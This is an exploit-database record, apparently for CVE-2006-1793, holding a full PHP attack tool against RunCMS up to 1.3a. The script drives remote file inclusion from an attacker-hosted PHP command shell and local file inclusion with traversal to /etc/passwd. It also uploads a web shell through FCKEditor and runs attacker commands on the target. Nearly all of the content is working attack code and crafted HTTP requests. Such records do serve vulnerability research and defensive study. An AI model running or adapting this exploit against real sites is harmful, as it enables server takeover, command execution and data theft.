{
  "id": "1485",
  "title": "RunCMS 1.2 - &#039;class.forumposts.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-1793",
  "vuln_type": "rce",
  "code": "<?php\r\n#   ---runcms_13a_xpl.php                                     17.30 09/02/2006 #\r\n#                                                                              #\r\n#                 RunCMS <= 1.2 arbitrary remote inclusion exploit             #\r\n#                   \"    <= 1.3a shell upload through FCKEditor                #\r\n#                              coded by rgod                                   #\r\n#                  site: http://retrogod.altervista.org                        #\r\n#                                                                              #\r\n#  usage: launch from Apache, fill in requested fields, then go!               #\r\n#                                                                              #\r\n#  Sun-Tzu: \"But when the army is restless and distrustful, trouble is sure to #\r\n#  come from the other feudal  princes. This is simply  bringing anarchy  into #\r\n#  the army, and flinging victory away.\"                                       #\r\n\r\n/* a short explaination:\r\n\r\n   i) on unpatched <=1.2 versions I tested:\r\n\r\n   if register_globals = On & allow_url_fopen = On\r\n   arbitrary remote inclusion in\r\n   modules/newbb_plus/class/class.forumposts.php\r\n   at line 15:\r\n\r\n   ...\r\n   include_once ($bbPath['path'].'/include/user_level.php');\r\n   ...\r\n\r\n   and in modules/newbb_plus/class/forumpollrenderer.php\r\n   at line 14:\r\n\r\n   ...\r\n   include_once($bbPath['path'].\"language/\".$xoopsConfig['language'].\"/main.php\");\r\n   ...\r\n\r\n   poc:\r\n   http://[target]/[path]/modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=http://somehost\r\n   http://[target]/[path]/modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&xoopsConfig[language]=suntzu&bbPath[path]=http://somehost/\r\n\r\n   where on [somehost] you have:\r\n\r\n   <?php ob_clean();echo\"HiMaster!\";ini_set(\"max_execution_time\",0);passthru($cmd);die;?>\r\n\r\n   in http://[somehost]/include/user_level.php/index.html\r\n   and in: http:/[somehost]/language/suntzu/main.php/index.html<br>\r\n\r\n   it seems this vulnerabilties has been patched from 1.3 version\r\n   and old packages <= 1.2 has been uptaded with new patches\r\n\r\n   ii) on unpatched <=1.2:\r\n   if allow_url_fopen = Off, but magic_quotes_gpc = Off, you can include a file\r\n   from local resources:\r\n\r\n   http://[target]/[path]/modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00\r\n   http://[target]/[path]/modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00\r\n   http://[target]/[path]/modules/newbb_plus/class/class.forumposts.php?bbPath[path]=../../../../../../../../etc/passwd%00\r\n   http://[target]/[path]/modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=../../../../../../../../etc/passwd%00\r\n\r\n   iii) on 1.3a version:\r\n\r\n   also, integrated in runCMS we have an old version of FCKEditor\r\n   (see this exploit link: http://retrogod.altervista.org/fckeditor_22_xpl.html)\r\n   so you can upload files on target machine, .php3 files, .php5 and inc files\r\n   call them directly (iii.a) and if not set as executable files on target machine,\r\n   you can try local inclusion with versions <=1.2 (ii.b)\r\n\r\n   poc:\r\n   (iii.a) http://[target]/[path]/UserFiles/File/shell.php5?cmd=ls%20-la\r\n   (ii.b) http://[target]/[path]/modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00\r\n          http://[target]/[path]/modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00\r\n\r\n                                                                              */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 5);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>********RunCMS <= 1.3a remote commands execution********\r\n</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<style type=\"text/css\"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:\r\n#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:    #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;\r\ncolor : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\n********RunCMS <= 1.3a remote commands execution*********</p><p class=\"Stile6\">a\r\nscript  by  rgod  at        <a href=\"http://rgod.altervista.org\"target=\"_blank\">\r\nhttp://retrogod.altervista.org</a></p><table width=\"84%\">  <tr> <td width=\"43%\">\r\n<form name=\"form1\" method=\"post\"   action=\"'.$_SERVER[PHP_SELF].'\">    <p><input\r\ntype=\"text\"  name=\"host\"> <span class=\"Stile5\">* hostname  (ex:www.sitename.com)\r\n</span></p> <p><input type=\"text\" name=\"path\">  <span class=\"Stile5\">* path (ex:\r\n/runcms/  or just / ) </span></p><p><input type=\"text\" name=\"CMD\">         <span\r\nclass=\"Stile5\"> * specify a command     </span></p>    <p>    <input type=\"text\"\r\nname=\"LOCATION\"><span class=\"Stile5\">a remote location ( ex: http://www.somesite\r\n.com, without traling slashes) , if you leave empty STEP 1-2 will be skipped...,\r\nit works with versions <=1.2  </span></p><p><input type=\"text\" name=\"port\"><span\r\nclass=\"Stile5\">specify  a  port other than  80 (default value)</span> </p>   <p>\r\n<input  type=\"text\" name=\"proxy\"><span class=\"Stile5\">send  exploit  through  an\r\nHTTP proxy (ip:port)</span> </p> <p>          <input type=\"submit\" name=\"Submit\"\r\nvalue=\"go!\"></p></form></td></tr></table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".htmlentities($headeri[$li+$ki]).\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".htmlentities($datai).\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".htmlentities($datai).\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".htmlentities($headeri[$li]).\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() //2x speed\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {echo 'Not a valid prozy...';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($proxy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $html= '';\r\n    socket_write($socket, $packet, strlen($packet));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n    echo nl2br(htmlentities($html));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);echo nl2br(htmlentities($html));\r\n}\r\nfunction refresh()\r\n{\r\n  flush();\r\n  ob_flush();\r\n  usleep(100000);\r\n}\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n  $host=$_POST[host];$path=$_POST[path];\r\n  $port=$_POST[port];$LOCATION=$_POST[LOCATION];\r\n  $CMD=$_POST[CMD];$proxy=$_POST[proxy];\r\n\r\n  echo \"<span class=\\\"Stile5\\\">\";\r\n\r\n  if (($host<>'') and ($path<>'') and ($CMD<>''))\r\n  {\r\n    $port=intval(trim($port));\r\n    if ($port=='') {$port=80;}\r\n    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}\r\n    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n    $host=str_replace(\"\\n\",\"\",str_replace(\"\\r\",\"\",$host));\r\n    $path=str_replace(\"\\n\",\"\",str_replace(\"\\r\",\"\",$path));\r\n    $CMD=urlencode($CMD);\r\n\r\n    if ($LOCATION<>'')\r\n    {\r\n      # STEP 1 -> arbitrary remote inclusion in modules/newbb_plus/class/class.forumposts.php\r\n      $packet=\"GET \".$p.\"modules/newbb_plus/class/class.forumposts.php?\";\r\n      $packet.=\"cmd=$CMD&bbPath[path]=$LOCATION HTTP/1.1\\r\\n\";\r\n      $packet.=\"Host: \".$host.\"\\r\\n\";\r\n      $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n      show($packet);\r\n      sendpacketii($packet);\r\n      if (eregi(\"HiMaster!\",$html)) {echo \"Exploit succeeded...\";die;}\r\n\r\n      # STEP 2 -> arbitrary remote inclusion in modules/newbb_plus/class/forumpollrenderer.php\r\n      $packet=\"GET \".$p.\"modules/newbb_plus/class/forumpollrenderer.php?\";\r\n      $packet.=\"cmd=$CMD&bbPath[path]=$LOCATION/&xoopsConfig[language]=suntzu HTTP/1.1\\r\\n\";\r\n      $packet.=\"Host: \".$host.\"\\r\\n\";\r\n      $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n      show($packet);\r\n      sendpacketii($packet);\r\n      if (eregi(\"HiMaster!\",$html)) {echo \"Exploit succeeded...\";die;}\r\n      //if you are here...\r\n      echo \"Arbitrary remote inclusion failed... trying STEP 3 -> Uploading a shell through FCKEditor<br>\";\r\n    }\r\n\r\n\r\n    # STEP 3 -> Use FCKEditor to upload malicious code\r\n    $SHELL =\"<?php echo chr(72).\\\"iMaster!\\\";ini_set(\\\"max_execution_time\\\",0);error_reporting(0);\";\r\n    $SHELL.=\"phpinfo();passthru(\\$HTTP_GET_VARS[cmd]);?>\";\r\n    //we try to guess allowed extensions...\r\n    // you should succeed with .php3\r\n    $extensions= array('.php', '.php3', '.php5', '.phtml','.pwml', '.php4', '.php2', '.inc');\r\n    //add what you want\r\n    //'FileUpload' for versions 2.11 - 2.1 - 2.0rc3 - 2.0rc2 - 2.0rc1 - 2.0fc\r\n    //empty for 2.2\r\n    $upload_command= array('FileUpload','');\r\n    $path_to_shell=\"/UserFiles/File/\"; //default one: if different, script will find it\r\n    //calculate how far we are from site root\r\n    $cc=explode(\"/\",$path);\r\n    $ccc=count($cc)-2;\r\n    $back=\"\";\r\n    for ($xx=1; $xx<=$ccc; $xx++) { $back.=\"../\";}\r\n    for ($x=0; $x<=count($extensions)-1; $x++)\r\n    {\r\n    for ($y=0; $y<=1; $y++)\r\n      {\r\n      # STEP 3a -> Upload the shell\r\n      srand(make_seed());\r\n      $anumber = rand(1,9999);\r\n      $filename=\"suntzu\".$anumber.$extensions[$x];\r\n      $data=\"-----------------------------7d529a1d23092a\\r\\n\";\r\n      $data.=\"Content-Disposition: form-data; name=\\\"NewFile\\\"; filename=\\\"$filename\\\"\\r\\n\";\r\n      $data.=\"Content-Type:\\r\\n\\r\\n\";\r\n      $data.=\"$SHELL\\r\\n\";\r\n      $data.=\"-----------------------------7d529a1d23092a--\\r\\n\";\r\n      $packet=\"POST \".$p.\"class/fckeditor/editor/filemanager/browser/default/connectors/php/\";\r\n      $packet.=\"connector.php?Command=\".$upload_command[$y].\"&Type=File&CurrentFolder= HTTP/1.1\\r\\n\";\r\n      $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\\r\\n\";\r\n      $packet.=\"User-Agent: Sun-tzu giving you the pain\\r\\n\";\r\n      $packet.=\"Host: \".$host.\"\\r\\n\";\r\n      $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n      $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n      $packet.=$data;\r\n      show($packet);\r\n      sendpacketii($packet);\r\n      if (!eregi(\"200 OK\",$html)) {die(\"Cannot find connector.php...<br>\");}\r\n      if (eregi(\"This connector is disabled\",$html)) {echo \"Exploit failed... -> php connector not enabled\";die;}\r\n      if (eregi(\"url=\\\"\",$html))\r\n      {\r\n        $temp=explode(\"url=\\\"\",$html);\r\n        $temp2=explode(\"\\\"\",$temp[1]);\r\n        $path_to_shell=$temp2[0];\r\n      }\r\n      echo \"<br>path where I search shell: \".htmlentities($path_to_shell).\"<br>\";\r\n      # STEP 3b -> Launch commands...\r\n      #by default a \"UserFiles/File/\" dir is generated inside site root when you upload\r\n      #files, this dir is not protected by an .htaccess file or whatever\r\n      $packet=\"GET \".$path_to_shell.$filename.\"?cmd=$CMD HTTP/1.1\\r\\n\";\r\n      $packet.=\"User-Agent: GoogleBot/1.1\\r\\n\";\r\n      $packet.=\"Host: \".$host.\"\\r\\n\";\r\n      $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n      show($packet);\r\n      sendpacketii($packet);\r\n      if (eregi(\"200 OK\",$html)){\r\n                                 if (eregi(\"HiMaster!\",$html))\r\n    \t\t\t                 { echo \"Exploit succeeded...<br>\";\r\n\t\t\t\t                   echo \"we have a shell in http://\".$host.$path_to_shell.$filename.\"<br>\";\r\n                     \t\t\t   echo \"we should have phpinfo() here, see html...<br>\";\r\n\t\t\t                       die;\r\n                                 }\r\n                                  else\r\n                                  {\r\n                                   echo \"Successfully uploaded...<br>\r\n\t\t\t                       but is not an executable on target server...<br>\r\n                                   let's try to include it...<br>\r\n                                   \";\r\n                                    # STEP 3c\r\n                                    $packet=\"GET \".$p.\"modules/newbb_plus/class/class.forumposts.php?\";\r\n                                    $packet.=\"cmd=$CMD&bbPath[path]=\".$back.\"../../..\".$path_to_shell.$filename.\"%00 HTTP/1.1\\r\\n\";\r\n                                    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n                                    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n                                    show($packet);\r\n                                    sendpacketii($packet);\r\n                                    if (eregi(\"HiMaster!\",$html)) {echo \"Exploit succeeded...\";die;}\r\n                                    # STEP 3d\r\n                                    $packet=\"GET \".$p.\"modules/newbb_plus/class/forumpollrenderer.php?\";\r\n                                    $packet.=\"cmd=$CMD&bbPath[path]=\".$back.\"../../..\".$path_to_shell.$filename.\"%00 HTTP/1.1\\r\\n\";\r\n                                    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n                                    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n                                    show($packet);\r\n                                    sendpacketii($packet);\r\n                                    if (eregi(\"HiMaster!\",$html)) {echo \"Exploit succeeded...\";die;}\r\n                                  }\r\n                                }\r\n      refresh();\r\n    }\r\n  }\r\n  //if you are here\r\n  echo \"Exploit failed...\";\r\n\r\n  }\r\n  else\r\n{echo \"Note: on remote location prepare this code in<br>\r\n        http:/[remote_location]/include/user_level.php/index.html<br>\r\n        and in:<br>\r\n        http:/[remote_location]/language/suntzu/main.php/index.html<br>\r\n        \";\r\n echo  nl2br(htmlentities(\"\r\n        <?php\r\n        ob_clean();echo\\\"HiMaster!\\\";ini_set(\\\"max_execution_time\\\",0);passthru(\\$cmd);die;\r\n        ?>\r\n        \"));\r\n echo    \"<br>Fill * required fields, optionally specify a proxy...\";}\r\n echo \"</span>\";\r\n?>\r\n\r\n# milw0rm.com [2006-02-09]",
  "url": "https://www.exploit-db.com/exploits/1485"
}